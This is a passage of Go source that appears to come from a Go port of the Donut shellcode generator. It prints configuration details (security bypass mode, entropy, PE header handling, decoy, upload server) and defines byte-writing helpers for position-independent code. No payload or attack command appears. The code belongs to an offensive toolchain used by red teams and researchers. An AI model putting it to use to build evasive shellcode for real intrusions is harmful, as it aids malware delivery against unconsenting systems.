		fmt.Println("    Class                :", string(o.Module.Cls[:]))
		fmt.Println("    Method               :", string(o.Module.Method[:]))
		domain := "Default"
		if o.Module.Domain[0] != 0 {
			domain = string(o.Module.Domain[:])
		}
		fmt.Println("    Domain               :", domain)
	}

	if o.Config.ModuleType == DONUT_MODULE_DLL {
		method := "DllMain"
		if o.Module.Method[0] != 0 {
			method = string(o.Module.Method[:])
		}
		fmt.Println("    Function             :", method)
	}

	fmt.Println("[Instance]")
	fmt.Println("    Type       :", o.Instance.Type.Name())
	fmt.Println("    Length     :", o.Instance.Len)
	fmt.Println("    Exit       :", o.Instance.ExitOpt.Name())
	fmt.Println("    Entropy    :", o.Instance.Entropy.Name())
	fmt.Println("    Bypass     :", o.Instance.Bypass.Name())
	fmt.Println("    PE Headers :", o.Instance.Headers.Name())
	if o.Instance.OEP != 0 {
		fmt.Printf("    OEP        : 0x%08X\n", o.Instance.OEP)
	}
	if o.Instance.Decoy[0] != 0x00 {
		fmt.Println("    Decoy      :", string(o.Instance.Decoy[:]))
	}

	fmt.Println("[Output]")
	fmt.Println("    File         :", o.Config.Output)
	fmt.Println("    Format       :", o.Config.Format.Name())
	fmt.Println("    Length       :", len(o.PicData))
	if o.Config.InstanceType == DONUT_INSTANCE_HTTP {
		fmt.Println("    ModuleName   :", o.Config.ModuleName)
		fmt.Println("    Upload to    :", o.Config.Server)
	}
}

func New(c *Config) *Gonut {
	if c.Headers == 0 {
		c.Headers = DONUT_HEADERS_OVERWRITE // 设置默认值
	}

	return &Gonut{
		Config: c,
	}
}

// FileInfo
// donut/include/donut.h
// typedef struct _file_info_t { ... }
type FileInfo struct {
	Data  []byte
	ZData []byte

	Type ModuleType
	Arch ArchType
	Ver  string

	PeFile *pe.File
}

func (f *FileInfo) Len() uint32 {
	return uint32(len(f.Data))
}

func (f *FileInfo) ZLen() uint32 {
	return uint32(len(f.ZData))
}

/*
#define PUT_BYTE(p, v)     { *(uint8_t *)(p) = (uint8_t) (v); p = (uint8_t*)p + 1; }
#define PUT_HWORD(p, v)    { t=v; memcpy((char*)p, (char*)&t, 2); p = (uint8_t*)p + 2; }
#define PUT_WORD(p, v)     { t=v; memcpy((char*)p, (char*)&t, 4); p = (uint8_t*)p + 4; }
#define PUT_BYTES(p, v, n) { memcpy(p, v, n); p = (uint8_t*)p + n; }
*/

type PicGenerator struct {
	buffer *bytes.Buffer
	length uint32
}

func (p *PicGenerator) PutByte(c byte) {
	p.buffer.WriteByte(c)
}

func (p *PicGenerator) PutUint32(v uint32) {
	b := make([]byte, 4) // 32/8=4
	binary.LittleEndian.PutUint32(b, v)
	p.PutBytes(b)
}

func (p *PicGenerator) PutBytes(v []byte) {
	p.buffer.Write(v)
}

func (p *PicGenerator) Result() []byte {
	padding := make([]byte, int(p.length)-p.buffer.Len())
	return append(p.buffer.Bytes(), padding...)
}

func NewPicGenerator(length uint32) *PicGenerator {
	return &PicGenerator{
		buffer: bytes.NewBuffer(nil),
		length: length,
	}
}
